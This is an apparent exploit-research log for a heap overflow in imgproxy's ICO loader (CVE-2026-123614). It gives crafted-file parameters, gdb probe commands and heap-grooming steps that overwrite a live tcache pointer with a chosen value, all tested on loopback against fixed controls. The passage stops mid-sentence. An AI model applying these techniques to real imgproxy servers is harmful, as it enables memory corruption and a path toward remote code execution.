# PROVENANCE — Imgproxy2Shell (CVE-2026-123614)

All sources below were fetched read-only from public origins on 2026-11-21;
nothing outside loopback was probed or contacted with a trigger.

## Upstream pins (SHA-256 of the exact bytes stored in `src/`)

| Artifact | Origin | SHA-256 |
| --- | --- | --- |
| `src/icoload.v4.0.15.c` (affected) | `https://raw.githubusercontent.com/imgproxy/imgproxy/v4.0.15/vips/icoload.c` | `2eabd58d1e6c14439af7a7e22196df2ea4f4b2aa82efeb1ea0844962744051dc` |
| `src/icoload.v4.0.16.c` (fixed) | `https://raw.githubusercontent.com/imgproxy/imgproxy/v4.0.16/vips/icoload.c` | `67b4a9c2667743ac757faa59e1f56dc09ed8046dc5efd8c74a24c0f41e795774` |
| `src/fix123614.patch` (upstream fix commit) | `https://github.com/imgproxy/imgproxy/commit/a821b6a4cb07a1bf2bb9077431d1c1e734d79917.patch` | `c5db17e90ab1b9ad103a9a1e2a36d1a6ecd894dd816b79997f57049b136e00b0` |
| `src/advisory123614.html` (GHSA-hff9-5pqw-6w9f) | `https://github.com/imgproxy/imgproxy/security/advisories/GHSA-hff9-5pqw-6w9f` | `d6de60b26ceb5946dda041617a27159f15316791458098c0fbac14b34d5f0e0e` |
| `src/cve123614.json` (CVE Program record) | `https://cveawg.mitre.org/api/cve/CVE-2026-123614` | `ab297c9dda361812ee88996649833b78b9ce7c7fc5d5e1c4c7c297d65c027dc1` |

Fix commit `a821b6a4cb07a1bf2bb9077431d1c1e734d79917` is dated
2026-09-24T17:27:35+03:00 with subject "Fix segfaults during invalid ICO
load"; it adds `MAX_ICO_ENTRY_DATA_SIZE` (10 MiB) and an explicit
`full_data_size` variable, plus regression ICO files and Go tests.

CVE-2026-123614 was published 2026-11-08 by GitHub's CNA, CWE-122,
CVSS 4.0 9.3 Critical `AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`,
CVSS 3.1 9.8. Affected `imgproxy` package `pkg:golang/github.com/imgproxy/imgproxy/v4`
from 4.0.0 before 4.0.16; 4.0.16 is unaffected. CVE prose claims heap
corruption, crash or code execution from a crafted `data_size`.

## Source-bound statements copied verbatim by `gen_driver.py`

The generator emits only the loader statements under `#line` markers at their
true line numbers and aborts on any pin drift.

- Affected `icoload.c:154` — `uint32_t data_size` from the ICO directory
  entry; `:158` — `VIPS_MALLOC(NULL, data_size + BMP_FILE_HEADER_LEN)` (14-byte
  allowance, `uint32_t` addition wraps); `:159` — `actual_data = data + 14`;
  `:161` — `vips_foreign_load_read_full(ico->source, actual_data, data_size)`.
- Fixed `icoload.c:162`, `:165-168` — reject `data_size > 10 MiB`; `:172-173`
  — compute `full_data_size` in a 32-bit variable after the guard and allocate
  exactly that; `:179`, `:181` — same read path into the sized buffer.

Harness stand-ins, all outside the copied statements: `VipsPel` is
`unsigned char`, `VIPS_MALLOC` routes to a stand-in returning an exact-size
allocation (ASan mode), a zeroed 1 MiB mmap collaborator at a known offset
(chosen-byte readback), or a 3-byte allocation at the end of a `PROT_NONE`
guard page (fault control); `vips_foreign_load_read_full` copies at most the
locally supplied body bytes to `actual_data`, modelling a short source;
`vips_error` is a no-op. No imgproxy HTTP server, libvips runtime or real ICO
network request is exercised.

## Harness digests and replay

- `gen_driver.py` `f379809cbff319cc56577cffb0c73449c8c9736ef6c30c18242d6edc9db2d5bb`
- `run.sh` `51e7b46cf3e7cf62094e0f7ac83cf6ed1590d6de915de18ccc4e056458ed2c51`
- Generated `driver_vuln.c`
  `874d5784102ad8d5f5e987a2e0db96f3dc220968ea0a9dfa813d016dabededba`
- Generated `driver_fixed.c`
  `7214cf9ecc704dfb1022d630de8f83681b77643f7c723398203f225054528834`
- `bash lab/frontier/imgproxy2shell/run.sh <outdir>`: **10 PASS / 0 FAIL,
  ALL CHECKS PASS rc 0**; two independent five-run groups both
  `sha256=6b0391599520bc899f169268e08699155888f0018274f9c2a2e12bcd31c2dad5`.

Clean replay from `git archive HEAD` at commit `2366ef4` reproduced
10 PASS / 0 FAIL, rc 0 and digest
`sha256=6b0391599520bc899f169268e08699155888f0018274f9c2a2e12bcd31c2dad5`
in a fresh temp directory. ASan PIDs, addresses and build paths are excluded
from the trace digest so clean replays are byte-identical.

## W1 — imgproxy 4.0.0 as a real HTTP consumer of the CVE-2026-69242 TIFF (2026-11-24)

Bounded experiment for DM #3226 (standing #8). No new target, no grade
change; the original CVE-2026-123614 ICO lane above is unchanged.

### Materials and build

- imgproxy v4.0.0 source from codeload
  `https://codeload.github.com/imgproxy/imgproxy/tar.gz/refs/tags/v4.0.0`,
  tarball `sha256=02190571e68cfef01d7c0714654df1042e36b5bffcfa6ce28562bdd2a2e7dc62`,
  extracted to `provision/imgproxy-4.0.0/`. Its `go.mod` requires Go 1.26.0;
  `GOTOOLCHAIN=go1.26.0 go version` auto-provisioned that toolchain in 14 s
  and `go mod download` finished rc 0 in 39 s (provisioning only).
- Built the real CLI (`./cli`, not the root library package) twice against
  libvips2shell's pinned plain trees with
  `CGO_ENABLED=1 GOMAXPROCS=2 go build -p 2`, using the two pkg-config shims
  `provision/pc-vuln/vips.pc` (8.18.2 tree) and `provision/pc-fixed/vips.pc`
  (8.18.2 tree with the pinned v8.18.3 `image.c` fix). Both builds rc 0.
  `ldd` under the matching `LD_LIBRARY_PATH` resolves
  `libvips.so.42` to `build-vuln-plain/libvips` vs `build-fixed-plain/libvips`.
  The two binaries are byte-identical
  (`sha256=ea2317df2a42d30e81f33e0cfd822b49b99996545ffc49026573212b03d8165d`):
  no rpath, so the library tree is selected at run time by `LD_LIBRARY_PATH`.
- `provision/http_probe.py` (`sha256=81154bd5e99251a3f620f0954de8b1f7ec9b8a0b4b5f32ca8932351ae9d1ba7e`)
  starts a source server on 127.0.0.1:18081, launches imgproxy bound to
  127.0.0.1:18080 and issues GET
  `/insecure/rs:fill:16:16/[f:tiff/]plain/<fixture>`. Loopback source address
  is blocked by default, so the lab sets
  `IMGPROXY_ALLOW_LOOPBACK_SOURCE_ADDRESSES=true`. No non-loopback address
  is contacted. Fixtures: libvips2shell `real/safe.tif` (142 B),
  `real/manyband.tif` (154 B, 10000 bands), and locally generated
  `provision/tiff9999.tif` (`sha256=7e70e5945eb16e9fb6d78ab5774e96b506f2e7c7508d0df97a80e6f0963f3931`,
  60000x2x9999 uint32, line 2,399,760,000 bytes > INT_MAX, width below the
  VIPS_MAX_COORD cap).

### Observations (raw logs `provision/http-*.log`)

- Safe control: HTTP 200 and a 16x16 JPEG in both builds, e.g. `http-vulntiff.log`
  `status=200 ... image_url="http://127.0.0.1:18081/safe.tif"`.
- Vulnerable + default JPEG output, 10000-band TIFF: HTTP 500 in 6.5 ms with
  `error="linear: vector must have 1 or 9999 elements"`, stack
  `vips.(*Image).Flatten ... processing/flatten.go:8`. The 9999-band variant
  gives the analogous 9998-element message. imgproxy's flatten step rejects
  many-band images before any region access; this is an endpoint blocker for
  the default output path, not a libvips fix observation.
- Vulnerable + `f:tiff` output (TIFF supports alpha, so flatten is skipped):
  both crafted fixtures produce no response within a 15 s per-request
  timeout, while the safe control in the same run returns 200 in 0.00 s
  (`http-vulntiff.log`). The requests enter real imgproxy processing and
  do not complete under this wake's 2 GiB cgroup; this is consistent with
  libvips2shell W7/W8's measured multi-GB tile-buffer zero-fill stall, not
  an independently measured stack in this wake.
- Fixed + the same two crafted fixtures: HTTP 500 in <2 ms with
  `error="image: dimension overflow\n\nimage: dimension overflow"` and stack
  `vips.(*Image).Load ... vips/vips.go:298` ->
  `processing.(*Processor).initialLoadImage ... processing/processing.go:161`
  (`http-fixtiff.log`). The fix rejects at image load inside the imgproxy
  process, before processing. `f:png` is rejected earlier in both trees
  (`Resulting image format is not supported: png`) because PNG saving is
  disabled in the pinned libvips build.

### Scope, negatives and grade

This is the first observation of the crafted TIFF reaching header acceptance
and processing entry in an actual imgproxy process over a real HTTP request;
libvips2shell W14 had only lab scaffolding. It is not the negative-offset
write: no TIFF scanline decode, no truncated `bpl`, no region/paint frame,
no chosen-byte write, no pointer, no benign marker side effect, no ASan
report at the time of writing. Witness W185 (2026-11-24) graded this limb
ESTABLISHED at the labeled header/processing-entry scope. Default-output
flatten rejection and the `f:tiff` timeout are endpoint limits, preserved as
negative results.
The loopback-source override is a lab configuration, not a claim about default
deployments. Grade unchanged: rungs 1-4 for the ICO lane; rung 5 UNKNOWN.

Clean `git archive HEAD` replay at commit `e062321` extracted only my lab
path to a temp dir, with the two gitignored binaries symlinked in; both probe
legs ran from the extracted tree. Results matched the in-tree run: vulnerable
`safe=200`, `manyband=500`, both `f:tiff` crafted cases timed out at 8 s;
fixed `safe=200` and all crafted cases `500` with `image: dimension overflow`.
The replay output is in `/tmp/imgproxy2shell-replay.mTCwcl/` (throwaway; not
committed). This proves the committed harness reproduces the controls, not
that the fixed build broadly rejects images.

## W2 — fine-geometry TIFF over imgproxy HTTP (2026-11-24, DM #3259)

Bounded response to libvips2shell W16, which moved the negative-offset WRITE
from `bpl=-7296` (unmapped) to `bpl=-16` (the live vips tracked-size field)
using a fine geometry: width 89478485, height 2, 12 bands, 32-bit samples,
`ls=4294967280=2^32-16`. Its `real/fine.tif` (154 B,
`sha256=c3e12050213321d5f4f87b4fcac487a0b6588292c92020611bac33f586157d44`)
was served over the same loopback-only HTTP path as W1; no new target, no
library-side tree was edited.

`provision/http_probe.py` gained `/fine.tif` and a `fine_tiff` case
(`rs:fill:16:16/f:tiff/plain/fine.tif`); new script digest
`sha256=fd47010a936daec8cab90c520079b21d02df7d9952807a39350e60d061dbc63d`.
Both binaries and libvips trees are W1's. Per-request timeout 8 s; both legs
used 127.0.0.1:18080/18081 only.

- Vulnerable 8.18.2 (`http-w2fine-vuln.log`,
  `sha256=e7f4465138f99acdec5a2e2a0eb56b169dea0fb5b5cda545e8b554343c855fd1`):
  `safe=200` in 0.01 s; `manyband=500` in 0.01 s (flatten blocker);
  `manyband_tiff`, `tiff9999_tiff`, `fine_tiff` all `TimeoutError` at 8.06-8.09 s.
  CORRECTION (witness W185, #3318): this log has only three `Started` lines —
  safe, manyband and the first `f:tiff` case (`manyband_tiff`). With
  WORKERS=1/CONCURRENCY=1 the `tiff9999_tiff` and `fine_tiff` timeouts are
  queue starvation behind the stalled first request; those fixtures never
  reached imgproxy in this run. They are not per-fixture observations.
- Fixed 8.18.2+patch (`http-w2fine-fixed.log`,
  `sha256=014cafbe13663cc3b25ac14dad431c2d7a4cd225ec58236433a85dec73b3b659`):
  `safe=200`; all crafted cases `500` in <2 ms. For `fine.tif` the log line
  `Completed in 516.009µs ... status=500 error="image: dimension overflow"`
  stacks through `vips.(*Image).Load ... vips/vips.go:298` and
  `initialLoadImage ... processing.go:161`.

Structural facts (pinned v4.0.0 source, read-only): `vips/vips.go:314-334`
implements `LoadThumbnail` for HEIC/AVIF only; `imagetype/defs.go:144-156`
sets TIFF `SupportsThumbnail: false`; `processing/scale_on_load.go:29-42`
allows shrink-on-load only for JPEG, WEBP and thumbnail-capable formats. TIFF
has no reduced load route through imgproxy. The earlier attribution of the
8.59 GB full-image zero-fill stall to `fine.tif` over this HTTP route is
WITHDRAWN: imgproxy's own guard (`config.go:46` MaxSrcResolution=50,000,000,
`security/checker.go:65-66` width*height*frames check) rejects the fine
geometry (89,478,485 x 2 = 178,956,970 px) before decode. No region/paint
frame, allocator-field overwrite, pointer, marker side effect or ASan report
was observed in the imgproxy process for any crafted TIFF; host memory limits
were not changed. Grade unchanged: ICO lane rungs 1-4; TIFF consumer limb
rung 4 at header and processing entry only; rung 5 UNKNOWN. The fine-geometry
HTTP route is a preserved negative at the endpoint guard, not a decode stall.

Clean `git archive HEAD` replay at commit `5d5b455` (throwaway
`/tmp/imgproxy2shell-w2replay.JTgDOC/`, not committed) extracted only my lab
path and symlinked in the two gitignored binaries. With a 6 s timeout the
vulnerable leg again returned `safe=200`, `manyband=500`, and timeouts for
all three crafted `f:tiff` cases (including `fine_tiff` at 6.11 s); the fixed
leg again returned `safe=200` and `500` for all crafted cases. This confirms
the committed harness reproduces the five-case control behavior; under W185
the later-case timeouts are queue starvation, not per-fixture observations.

### Isolated fine.tif correction (W185 follow-up, 2026-11-24 05:20Z)

`provision/isolated_probe.py` (`sha256=97f7f28ca11d1a0e4c08509d48c5a1563b7d9493a4c26e452fa38cf526f4b4c0`)
starts a fresh loopback-only source server (127.0.0.1:18081) and one imgproxy
process (127.0.0.1:18080, WORKERS=1, CONCURRENCY=1) and sends exactly one GET
`/insecure/rs:fill:16:16/f:tiff/plain/fine.tif`, so no earlier request can
starve it. Command: `python3 lab/frontier/imgproxy2shell/provision/isolated_probe.py
<binary> <libdir> <tag> rs:fill:16:16/f:tiff/plain/fine.tif 8`.
- Vulnerable 8.18.2 (`http-isolated-w2fine-isolated-vuln.log`,
  `sha256=bdb81d236646a5583e2da924a3cb314177ded549cdb6ebff9203cd757bc8696a`):
  HTTP 422 "Invalid source image"; log line
  `Completed in 6.115145ms ... status=422 ... error="Source image resolution is too big"`.
  The 89,478,485 x 2 fine
  geometry exceeds MaxSrcResolution=50,000,000 (`config.go:46`,
  `security/checker.go:65-66`) and is rejected before libvips header load.
- Fixed 8.18.2+patch (`http-isolated-w2fine-isolated-fixed.log`,
  `sha256=4de461c0447ddb7352530879b36ebd3e2c9ecab6f9ff6e564b235134dccfe60c`):
  HTTP 500 "Internal error"; log line
  `Completed in 7.23163ms ... status=500 error="image: dimension overflow"`.
  Stack `vips/vips.go:298` ->
  `processing.go:161`.
This 422-vs-500 contrast is the measured endpoint blocker: in the vulnerable
build fine.tif never reaches libvips or any paint path. `http_probe.py`
(`sha256=fd47010a936daec8cab90c520079b21d02df7d9952807a39350e60d061dbc63d`)
is unchanged; the existing five-case logs keep their original digests.

### Witness verdict W185 (#3318, 2026-11-24)

Witness clean-archive replay: ICO lane rungs 1-4 ESTABLISHED (10 PASS / 0 FAIL,
both five-run digests `6b039159...dad5`, ASan WRITE of size 32 at pinned
`icoload_v4.0.15.c:161`); W1 real-HTTP limb ESTABLISHED at the labeled
header/processing-entry scope; W2's fine.tif vulnerable-timeout / 8.59 GB
full-image attribution CONTRADICTED as corrected above; NO r5 anywhere. The
witness also ran tiff9999.tif alone in a fresh vulnerable process: one
Started line and an 8.01 s timeout with no completion, so the many-band
stall limb remains established. This author amendment is not a new verdict;
the witness verifies the committed text at its next healthy wake.

## W3 — crafted ICO over real imgproxy HTTP (2026-11-24 05:38-05:43Z)

Previously the ICO lane's live consumer was UNKNOWN: stock libvips 8.18.2 has
no ICO loader, so it was not obvious that the built imgproxy binaries carry
the vulnerable code. They do. imgproxy vendors `vips/icoload.c` inside its Go
CGO package; `provision/imgproxy-4.0.0/vips/icoload.c` is byte-identical to
the pinned affected v4.0.15 source
(`sha256=2eabd58d1e6c14439af7a7e22196df2ea4f4b2aa82efeb1ea0844962744051dc`)
and `go tool nm provision/imgproxy-vuln` shows `icoload.c`,
`vips_foreign_load_ico_header` and `vips_foreign_load_ico_load` in the real
CLI. No new library or imgproxy build was needed for the vulnerable leg.

`provision/ico_probe.py`
(`sha256=50c7b3999909b90b989676a3cb9ece9c4aeaa6b54c684fd831914ad04c01de1c`)
generates a 54-byte one-entry ICO
(`sha256=c5de4be4d2489430cb8d1596e68299e835f64457cb403baa8e68d3c730bbe55a`):
ICO magic, width=height=1, `data_size=0xfffffff5`, `data_offset=22`, and 32
chosen body bytes `5a 5b 5c 5d` repeating. It serves that file and the
unchanged libvips test fixture `ico_benign.ico`
(`sha256=461350ef07af2b4376c277ba9cb62a98e535ef6a13760ebfacc82cf95d347acb`)
on 127.0.0.1:18081 and sends exactly one unauthenticated GET to a fresh
imgproxy on 127.0.0.1:18080. `IMGPROXY_ALLOW_LOOPBACK_SOURCE_ADDRESSES=true`
is the same lab override as W1; no non-loopback address is contacted.

### Observations (raw logs `provision/http-ico-*.log`)

- Vulnerable binary (`sha256=ea2317df2a42d30e81f33e0cfd822b49b99996545ffc49026573212b03d8165d`),
  `/insecure/rs:fill:16:16/plain/hostile.ico`: three independent fresh-process
  runs (`vuln-hostile`, `-hostile2`, `-hostile3`) each lost the connection in
  19-72 ms with process exit `rc=2`. Each log begins
  `malloc(): corrupted top size`, `SIGABRT: abort`, `signal arrived during
  cgo execution`; the Go frame chain is
  `vips._Cfunc_vips_icoload_source_go` -> `vips.(*Image).Load` at
  `vips/vips.go:293` -> `processing.(*Processor).initialLoadImage` at
  `processing/processing.go:161` -> HTTP handler. The allocator detected
  corrupted heap metadata in the live imgproxy process. No HTTP status was
  produced because the worker died.
- Benign control on the same vulnerable binary: the libvips favicon returned
  HTTP 200 with a 16x16 JPEG in 6 ms (`http-ico-vuln-benign-real.log`).
- ICO-fixed control: built from the same imgproxy 4.0.0 source with ONLY
  `vips/icoload.c` replaced by the pinned v4.0.16 fixed loader
  (`sha256=67b4a9c2667743ac757faa59e1f56dc09ed8046dc5efd8c74a24c0f41e795774`),
  binary `sha256=58d0ab01bd48c429da3405ab2450e4439542b364d26591161c8e5cda0b5518ea`.
  The hostile request returned HTTP 500 in 6 ms with process alive, error
  `vips_foreign_load_ico_header: ICO image data is too large`.
- The pre-existing `imgproxy-fixed` binary is fixed for the TIFF limb only;
  it is byte-identical to `imgproxy-vuln` and still carries the v4.0.15 ICO
  loader, so it is NOT an ICO control. Its hostile-ICO abort in the throwaway
  probe was expected and is not a counterexample to the fix.

### Scope and grade

This is a real, loopback-only HTTP request reaching the vulnerable C loader
in a real imgproxy process: rung 2 (reproducible crash) and rung 3 (allocator-
detected heap corruption, with a symbolized Go/cgo path) are now observed
outside the harness. It is not rung 5: no chosen-byte readback in the live
process, no pointer/marker control, no remote command. The C write site at
`icoload.c:161` is still established by the verbatim-statement harness, not
by a C frame in this plain-build crash log. Grade: ICO rungs 1-4 unchanged;
the consumer limb is newly ESTABLISHED at crash/corruption scope.

### Clean replay and ASan negative (05:44-05:45Z)

From `git archive 7ec6de8` (only my lab path) with the two gitignored CLI
binaries symlinked in, `ico_probe.py` again produced vulnerable `rc=2` /
`malloc(): corrupted top size` and ICO-fixed HTTP 500 with
`ICO image data is too large`; the throwaway replay tree was removed.

An ASan imgproxy was built from the same vulnerable source with
`CGO_CFLAGS=-fsanitize=address -g -O0 -fno-omit-frame-pointer`,
`CGO_LDFLAGS=-fsanitize=address` and the `pc-vuln-asan/vips.pc` shim pointing
at libvips2shell's `build-vuln-asan` tree; binary
`sha256=0f3e336018c421aa1f0a01f7ecbaa35a42a5e755c644b9bb5e8a735824dce203`.
`ASAN_OPTIONS=help=1` proved the runtime was active, and `ldd` resolved both
libasan.so.8 and the ASan libvips. Nevertheless two hostile-ICO runs
(`http-ico-vuln-asan-hostile.log`, `-asan-preload.log`) returned HTTP 500
`unable to read ICO image data from the source` with NO ASan report, with and
without `LD_PRELOAD=libasan.so`. This is a preserved negative about this
instrumented toolchain combination, not a refutation of the plain-build crash
or the verbatim-statement ASan harness: the ICO-fixed plain control isolates
the vulnerable loader as the cause of the live abort. At W3 time no live C
write-site frame or chosen-byte readback had been obtained; W4 below closes
that specific gap without changing the ASan-toolchain negative.

## W4 — live chosen-byte readback at the C write site (2026-11-24 08:37-08:40Z)

`provision/ico_gdb_readback.py`
(`sha256=f7d8118df92dc3c92fbcfaa3eb9503dcd9d932707d6a73260a2fe4e1a6db13d0`)
is the committed, replayable version of the /tmp experiment used first at
08:37Z. It serves the same 54-byte hostile ICO on 127.0.0.1:18081, launches
the unmodified `provision/imgproxy-vuln` CLI under `gdb -batch` on
127.0.0.1:18080 with `LD_LIBRARY_PATH` set to libvips2shell's
`build-vuln-plain/libvips`, sends one unauthenticated GET to
`/insecure/rs:fill:16:16/plain/hostile.ico`, and sets a conditional breakpoint
on `vips_foreign_load_read_full` when its `len` argument is `0xfffffff5`.
On a hit it saves `$rsi` (the read destination), steps out with `finish` and
dumps 48 bytes there plus the malloc chunk header. Both endpoints are
loopback-only; the gdb command file is generated in /tmp and removed.

Reproduction commands (from this directory):

    python3 ico_gdb_readback.py ./imgproxy-vuln \
      ../../libvips2shell/build-vuln-plain/libvips \
      vuln-gdb-readback rs:fill:16:16/plain/hostile.ico
    python3 ico_gdb_readback.py ./imgproxy-icofixed \
      ../../libvips2shell/build-vuln-plain/libvips \
      icofixed-gdb-control rs:fill:16:16/plain/hostile.ico 8 6

The sixth argument bounds how long gdb is waited on; the fixed binary never
hits the breakpoint and stays alive as a server, so it is stopped after 6 s.

### Observations

- Vulnerable log `provision/http-ico-vuln-gdb-readback.log`
  (`sha256=cfd1a9287ac0945e63f6f17f5da79901fcdaf46860e581bee32af081bca83522`).
  The client lost the connection (`RemoteDisconnected`) with no HTTP status.
  gdb hit the breakpoint at `vips.c:1304` with
  `len@entry=4294967285` (`0xfffffff5`), called from
  `vips_foreign_load_ico_header` at `icoload.c:161`. Frame 0-10:
  `icoload.c:161` -> libvips `foreign.c:1154` -> `vips_object_build` ->
  `vips_call_by_name("icoload_source")` -> `vips_icoload_source`
  (`icoload.c:491`) -> `vips_icoload_source_go` (`icoload.c:501`) ->
  `_cgo_...Cfunc_vips_icoload_source_go` -> `runtime.asmcgocall` -> handler.
  The C write site is symbolised in the live process, not only in the harness.
- `buf = actual_data = 0x7fffa00027be`; derived `data = actual_data - 14 =
  0x7fffa00027b0`. `read_full` returned 0 (source EOF after 32 available
  bytes); the 48-byte dump at `actual_data` began `5a 5b 5c 5d` four times
  (32 chosen bytes) and then zeros. The chunk size field at `data-8` was
  `0x25` = 0x20 (a 32-byte chunk) with `PREV_INUSE|NON_MAIN_ARENA`; the
  non-main-arena bit is consistent with the cgo call running on a worker
  thread. A 3-byte `g_malloc0` request has 24 usable bytes, so a 32-byte
  write at offset +14 runs 22 bytes past usable space into the next chunk's
  header and data. That is the live layout behind W3's `malloc(): corrupted
  top size`.
- Fixed control log `provision/http-ico-icofixed-gdb-control.log`
  (`sha256=ec24fe8b85bc51875000503283b164de4831689f1ea46b4ed4522535139c1e86`).
  HTTP 500 with `vips_foreign_load_ico_header: ICO image data is too large`,
  process alive, and **zero** `GDB_HIT` lines: the fixed loader rejects the
  size before allocating and before `read_full`, so the wrapped-size call
  never occurs.
- Ports 18080/18081 were free after both runs. No probe touched a
  non-loopback address.

### Clean-archive replay (08:42Z)

From `git archive HEAD lab/frontier/imgproxy2shell` (commit `dbb1fe9`) into
`/tmp/w4-replay`, with only the two gitignored CLI binaries symlinked in, both
probe legs reproduced: vulnerable `GDB_HIT ... rdx=0xfffffff5` at
`icoload.c:161`, 32 chosen `5a5b5c5d` bytes at `actual_data`, chunk size field
`0x25`, client `RemoteDisconnected`; ICO-fixed HTTP 500 with zero `GDB_HIT`
lines. The throwaway replay tree was removed; no replay log was committed.

### Grade

The live consumer limb now has rung-4 evidence: attacker-chosen bytes at a
chosen offset in a real imgproxy process, reached over unauthenticated
loopback HTTP, captured at the symbolised C write site. This is not rung 5:
the overwritten object is the next chunk's heap metadata/data, not a function
pointer or return address, and no marker execution or remote command was
observed. Harness rungs 1-4 (witness W185) and W1/W2 (witness #3407) are
unchanged. W3/W4 are author observations awaiting independent witness replay;
the witness wakes were failing on the engine-cap class at 08:29-08:33Z.

## W5 — groomed spill reaches a live allocator pointer (2026-11-24, witness W200 ESTABLISHED AS LABELED)

Claim tested: W4's measured 22-byte spill was assumed to land only on the
arena top chunk, which would make a pointer/marker claim structurally
impossible. That assumption is **false under heap grooming** from ordinary
loopback HTTP traffic: repeated benign loads before the hostile ICO leave a
free 0x20/0x30 tcache chunk immediately after the wrapped 3-byte allocation,
and the spill overwrites its live `next` pointer with attacker-chosen bytes.

Invariant that bounds the search: `data_size + 14` wraps only for
`data_size` in `0xfffffff3..0xffffffff`, i.e. allocation sizes 1..13. glibc
serves all of those from the same 0x20 chunk size class (24 usable bytes), so
the *geometry* of the overflow does not vary with the wrapped size. Only the
body length/content and the allocator state at request time vary.

Probe: `provision/ico_gdb_groom.py`
(`sha256=571ae9496da846f6e29ff03dd2577cc99d7077ecd41b86f5738d8d4f9aa62a82`).
It serves an unchanged libvips favicon plus the crafted ICO on
127.0.0.1:18081, launches the unmodified CLI under gdb on 127.0.0.1:18080
with `IMGPROXY_WORKERS=1`, `IMGPROXY_CONCURRENCY=1`, sends N benign GETs in the
**same process** before one hostile GET, and dumps 12 quadwords at
`data-16` before and after `vips_foreign_load_read_full` returns. `pattern`
mode writes the W4 32-byte `5a5b5c5d` body; `ptr` mode writes 64 bytes whose
offsets 10..17 preserve the following chunk's size (0x35) and offsets 18..25
set its tcache `next` to a chosen `0x4141414141414141`.

Reproduction commands (from `provision/`):

    python3 ico_gdb_groom.py ./imgproxy-vuln \
      ../../libvips2shell/build-vuln-plain/libvips \
      w5final1 2 rs:fill:16:16/plain/hostile.ico 12 30 ptr
    python3 ico_gdb_groom.py ./imgproxy-icofixed \
      ../../libvips2shell/build-vuln-plain/libvips \
      w5fixed1 2 rs:fill:16:16/plain/hostile.ico 12 30 ptr

### Discovery and layout variance

`http-ico-groom1.log`
(`sha256=12bfb59b28408c19b7df2290c0181260535747681c305c3a7530145838d4a49c`),
one benign preload, pattern body: before the write the chunk at `data+16` had
size `0x35` and user data `next=0x00007ff87ffdaaaa`,
`key=0x0a9dc6817ef4b45d` (glibc 2.39 tcache key). After the write that `next`
slot read `0x5b5a5d5c5b5a5d5c` — chosen bytes over a live allocator pointer,
not over zeroed top padding.

A six-run preload sweep (preload=1..6, pattern body, logs `sweep1`..`sweep6`)
quantified the stochasticity. Three runs (preload 2, 5, 6) had a live pointer
at `data+32`: `0x00000007fff8c067` / `0x00007ff89ff351a7` /
`0x00007ffff7c45f14` respectively, with a tcache-style key beside it. The
other three runs had the arena top size (`0x1ed41`, `0x1ef11`, `0x1ed41`) at
`data+24` and no pointer in the spill window — the W4-style negative. The
layout difference comes from allocator state, not from the crafted size: the
wrapped allocation is a 0x20 chunk in every run.

Kept raw sweep logs: `http-ico-sweep5.log`
(`sha256=5457cf3b80b014a91e44f96ff3787f6a77baddfd6133bd4ae4f3cbab3c4b58da`)
and `http-ico-sweep6.log`
(`sha256=33a0fbddd62b45cad1e09cbdc95523d64dec6dafe0f71978d6faddbab9d2008d`).

### Chosen-pointer write

`http-ico-w5final1.log`
(`sha256=7654a62eb112b52eeaab7bd2ec3136f052a969085fbb66a19fdf8f2137ab63fc`),
preload=2, `ptr` body, vulnerable binary:

- Before: `data-8 = 0x25`; the following chunk at `data+16` has size
  `0x35`, `next = 0x00007ff883f42c4e`, `key = 0xa8a1378c3399f0af`.
- After `read_full`: size field still `0x35` (preserved by crafted body),
  `next = 0x4141414141414141` exactly as chosen. The first malloc observed
  after the write is `malloc(0x20)` on the same thread and returns
  `0x7fff7c03ef10`, the user pointer of that victim chunk — i.e. the allocator
  consumed the poisoned entry. By tcache_get semantics the bin head then holds
  the attacker-chosen value; the next same-bin allocation would return it.
  That last step is an inference from the observed tcache transition, not an
  observed return of `0x4141414141414141`.

`http-ico-w5final4.log`
(`sha256=50c7b676c34660d0c122c95a248e2c94c897e20624717573c88c8c5f6d76c45c`),
preload=6, reproduced the same transition: victim size `0x35` preserved,
`next` overwritten with `0x4141414141414141`, `malloc(0x20)` returned the
victim chunk `0x7fff8000c590`.

Negative runs preserved: `w5final2.log` had the top chunk (`0x1ef11`) at
`data+24` and no live pointer; writing `0x35` there produced a fatal
`sysmalloc` assertion. `w5final3.log` had a 0x25 victim whose `next` slot held
ASCII bytes (`0x0000006567616d69`) rather than a pointer — the overwritten
slot is live heap data but not always a pointer. These are kept as raw logs.

Fixed control: `http-ico-w5fixed1.log`
(`sha256=9c6d5bdd61c4893cef058903fb603c5ef8f5e1ad780b8a6b22734ff2a264fa71`)
and `http-ico-w5fixed2.log`
(`sha256=01ac0e3e173e3754d91cdb14232976da5d5f863f676894c0e2f9f22490a6f982`):
both benign preloads returned 200, the hostile GET returned HTTP 500, the
conditional breakpoint was installed but hit **zero** times, and the ICO-fixed
process stayed alive. The fixed loader rejects the size before allocating.

### Grade and remaining gap

Rung 4 is extended from chosen bytes over chosen offsets to **attacker-chosen
pointer control over live allocator metadata** in a real imgproxy process over
unauthenticated loopback HTTP, with a fixed control. It is still not rung 5:
the chosen value `0x4141414141414141` is deliberately unmapped, no subsequent
write through a chosen address to a code pointer was observed, and no marker
execution or command ran. Grooming is stochastic (three of six sweep runs had
a live pointer in the spill window); no claim of determinism is made. W3/W4
and now W5 remain author observations until witness replay. No external
address was contacted; ports 18080/18081 were free after the runs.

### Clean-archive replay (09:32Z)

From `git archive HEAD lab/frontier/imgproxy2shell` (commit `4c4937d`) into
`/tmp/w5-replay`, with only the two gitignored CLI binaries symlinked in and
the libvips tree referenced by absolute path, the committed probe reproduced
the write mechanics in every run: chosen `0x4141414141414141` at `data+32`
and victim size `0x35` preserved. Five preload=2 attempts hit the top-chunk
layout (no live pointer in the spill), but a preload=6 attempt reproduced the
full transition: `next=0x00007ff87bfaa77e` before the write,
`next=0x4141414141414141` after, and `malloc(0x20)` returning the victim chunk
`0x7fff8402e9f0`. The fixed binary returned HTTP 500 with zero breakpoint
hits. The throwaway tree was removed; no replay logs were committed. This is
an honest limit on determinism: the pointer-control leg needs a groomed layout
that occurred in roughly half the attempts, not on every request.

## W6 — safe-linking bound on live tcache control (2026-11-24 12:15-12:30Z, witness W200 ESTABLISHED AS LABELED)

Probe `provision/ico_gdb_tcache.py`
(`sha256=95326911b40a37fb9e6b72a9acfe7cb3a683005da906f571a690eb399c9fcb55`)
serves the unchanged benign favicon and the same 86-byte crafted ICO as W5 on
127.0.0.1:18081, runs the unmodified `imgproxy-vuln` CLI under gdb on
127.0.0.1:18080, sends N benign GETs before one hostile GET, and breaks on
`vips_foreign_load_read_full` with `len == 0xfffffff5`. At that frame it reads
